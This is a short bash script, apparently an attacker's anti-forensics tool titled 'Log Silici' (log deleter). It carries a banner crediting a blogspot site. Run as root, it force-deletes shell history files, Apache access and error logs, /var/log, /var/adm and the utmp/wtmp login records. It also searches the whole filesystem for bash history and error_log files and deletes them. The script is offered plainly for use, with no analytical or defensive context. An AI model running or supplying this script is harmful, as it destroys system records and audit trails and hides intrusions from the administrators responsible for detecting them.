#!/bin/bash 
#./shell.404 
echo 'Log Silici - VOİXSEC.BLOGSPOT.COM' history -c 
rm -rf /tmp/logs 
rm -rf $HISTFILE 
rm -rf /root/.ksh_history 
rm -rf /root/.bash_history 
rm -rf /root/.ksh_history 
rm -rf /root/.bash_logout 
rm -rf /usr/local/apache/domlogs/* 
rm -rf /usr/local/apache/logs 
rm -rf /usr/local/apache/log 
rm -rf /var/apache/logs 
rm -rf /var/apache/log 
rm -rf /var/run/utmp 
rm -rf /var/logs 
rm -rf /var/log 
rm -rf /var/adm 
rm -rf /etc/wtmp 
rm -rf /etc/utmp
find / -name *.bash_history -exec rm -rf {} \; 
find / -name *.bash_logout -exec rm -rf {} \; 
find /home/*/public_html -name ‘error_log*’ | xargs rm -rf 
echo '[+] Done .X'
